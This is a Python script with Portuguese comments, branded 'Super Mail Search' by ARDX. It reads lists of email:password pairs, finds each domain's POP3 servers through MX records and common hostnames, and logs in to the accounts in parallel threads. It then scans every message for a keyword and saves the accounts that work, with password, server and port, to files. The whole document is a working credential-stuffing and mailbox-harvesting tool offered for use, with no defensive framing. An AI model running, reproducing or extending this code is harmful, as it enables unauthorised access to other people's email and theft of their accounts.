import argparse
import gevent
from gevent import monkey
from gevent.pool import Pool
import dns.resolver
import poplib
import logging
import socket
import time
import chardet
from typing import List, Tuple, Dict

# Aplicar monkey patch para tornar o código compatível com gevent
monkey.patch_all()

# Configuração básica de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Arte ASCII
ascii_art = """
  ____  _            _   _           
 |  _ \| |          | | | |          
 | |_) | | ___  ___ | |_| |_ ____ __ 
 |  _ <| |/ _ \/ __| __| __/ _ \ '__| 
 | |_) | |  __/\__ \ |_| ||  __/ |   
 |____/|_|\___||___/\__|\__\___|_|   Super Mail Search 
                                      By: ARDX
"""

def detect_encoding(file_path: str) -> str:
    """Detecta a codificação do arquivo."""
    try:
        with open(file_path, 'rb') as f:
            raw_data = f.read()
            result = chardet.detect(raw_data)
            encoding = result['encoding']
            if encoding is None:
                encoding = 'utf-8'  # Codificação padrão se a detecção falhar
    except Exception as e:
        logging.error(f'Erro ao detectar codificação do arquivo {file_path}: {e}')
        encoding = 'utf-8'  # Default para utf-8 em caso de erro
    return encoding

def read_credentials(file_path: str) -> List[Tuple[str, str]]:
    """Lê as credenciais de um arquivo."""
    credentials = []
    encoding = detect_encoding(file_path)
    try:
        with open(file_path, 'r', encoding=encoding) as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                email, password = line.split(':', 1)
                credentials.append((email.strip(), password.strip()))
    except FileNotFoundError as e:
        logging.error(f'Arquivo de credenciais não encontrado: {e}')
    except Exception as e:
        logging.error(f'Erro ao ler o arquivo de credenciais: {e}')
    return credentials

def read_pop3_servers(file_path: str) -> Dict[str, int]:
    """Lê servidores POP3 e suas portas de um arquivo."""
    servers = {}
    encoding = detect_encoding(file_path)
    try:
        with open(file_path, 'r', encoding=encoding) as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    server, port = line.split(':', 1)
                    servers[server.strip()] = int(port.strip())
    except FileNotFoundError as e:
        logging.error(f'Arquivo de servidores POP3 não encontrado: {e}')
    except Exception as e:
        logging.error(f'Erro ao ler o arquivo de servidores POP3: {e}')
    return servers

def discover_pop3_servers(domain: str) -> List[str]:
    """Descobre servidores POP3 usando registros MX e subdomínios comuns."""
    servers = []
    try:
        mx_records = dns.resolver.resolve(domain, 'MX')
        for r in mx_records:
            servers.append(str(r.exchange).rstrip('.'))
    except dns.resolver.NoAnswer:
        logging.warning(f'Nenhum registro MX encontrado para {domain}')
    except dns.resolver.NXDOMAIN:
        logging.warning(f'Domínio não encontrado: {domain}')
    except Exception as e:
        logging.warning(f'Erro ao buscar registros MX para {domain}: {e}')
    
    servers.extend([
        f'pop3.{domain}',
        f'pop.{domain}',
        f'mail.{domain}'
    ])
    return servers

def try_connection(email: str, password: str, server: str, port: int, timeout: int = 30) -> poplib.POP3_SSL:
    """Tenta conectar a um servidor POP3 com as credenciais fornecidas."""
    try:
        logging.info(f'Tentando conectar ao servidor POP3 {server}:{port} com {email}')
        mail = poplib.POP3_SSL(server, port, timeout=timeout)
        mail.user(email)
        mail.pass_(password)
        return mail
    except (poplib.error_proto, socket.timeout, socket.gaierror) as e:
        logging.error(f'Erro ao conectar ou autenticar no servidor {server}:{port}: {e}')
        return None

def search_criteria(mail: poplib.POP3_SSL, criteria: str, email: str, password: str, server: str, port: int, google_output_file: str) -> bool:
    """Busca por e-mails contendo o critério especificado em várias partes dos e-mails e pastas."""
    try:
        found = False
        num_messages = len(mail.list()[1])
        
        for i in range(num_messages):
            msg_lines = mail.retr(i + 1)[1]
            msg = b'\n'.join(msg_lines).decode('utf-8', errors='ignore')
            if criteria.lower() in msg.lower():
                logging.info(f'Palavra-chave encontrada na mensagem {i + 1} no servidor {server}')
                found = True
                break

        if found:
            with open(google_output_file, 'a') as f:
                f.write(f'{email}:{password}:{server}:{port}\n')  # Registro completo de e-mail, senha, servidor e porta
        return found
    except poplib.error_proto as e:
        logging.error(f'Erro ao buscar e-mails: {e}')
        return False

def process_email(email: str, password: str, criteria: str, pop3_servers_file: str, output_file: str, google_output_file: str):
    """Processa cada conta de e-mail tentando conexões com vários servidores POP3."""
    domain = email.split('@')[1]
    servers_to_try = discover_pop3_servers(domain)
    servers_from_file = read_pop3_servers(pop3_servers_file)
    
    # Adiciona servidores da lista fornecida
    servers_to_try.extend(servers_from_file.keys())
    servers_to_try = list(set(servers_to_try))

    for server in servers_to_try:
        if server in servers_from_file:
            ports_to_try = [servers_from_file[server]]  # Usar a porta correta listada no arquivo
        else:
            ports_to_try = [995, 110]  # Tentar ambas as portas para servidores não listados

        for port in ports_to_try:
            try:
                mail = try_connection(email, password, server, port)
                if mail:
                    found_criteria = search_criteria(mail, criteria, email, password, server, port, google_output_file)
                    if found_criteria:
                        break
                    mail.quit()
                time.sleep(1)  # Esperar antes de tentar o próximo servidor
            except Exception as e:
                logging.error(f'Erro inesperado com o servidor {server}:{port}: {e}')
    
    with open(output_file, 'a') as f:
        f.write(f'{email}:{password}\n')

def parse_arguments():
    """Analisa argumentos da linha de comando."""
    parser = argparse.ArgumentParser(
        description='Script para buscar e-mails em servidores POP3 e procurar uma palavra-chave.',
        epilog='Exemplo de uso: python ardx.py -i credentials.txt -c google -t 30 -f pop3_servers.txt -o output.txt -g outputgoogle.txt'
    )
    parser.add_argument(
        '-i', '--input',
        required=True,
        help='Arquivo com a lista de credenciais no formato email:senha.'
    )
    parser.add_argument(
        '-c', '--criteria',
        required=True,
        help='Palavra ou critério de busca nos e-mails.'
    )
    parser.add_argument(
        '-t', '--threads',
        type=int,
        default=10,
        help='Número de threads para processamento (padrão: 10).'
    )
    parser.add_argument(
        '-f', '--file',
        required=True,
        help='Arquivo com a lista de servidores POP3 e suas portas no formato servidor:porta.'
    )
    parser.add_argument(
        '-o', '--output',
        required=True,
        help='Arquivo para salvar os resultados de logon bem-sucedidos.'
    )
    parser.add_argument(
        '-g', '--google_output',
        required=True,
        help='Arquivo para salvar os resultados que contêm a palavra-chave, incluindo servidor, porta, e-mail e senha.'
    )
    return parser.parse_args()

def main():
    """Função principal para rodar o script."""
    # Exibir arte ASCII e aguardar a entrada do usuário
    print(ascii_art)
    input('Pressione Enter para iniciar o script...')

    # Analisar argumentos e iniciar o processamento
    args = parse_arguments()
    credentials = read_credentials(args.input)
    pool = Pool(args.threads)

    for email, password in credentials:
        pool.spawn(process_email, email, password, args.criteria, args.file, args.output, args.google_output)

    pool.join()

if __name__ == '__main__':
    main()
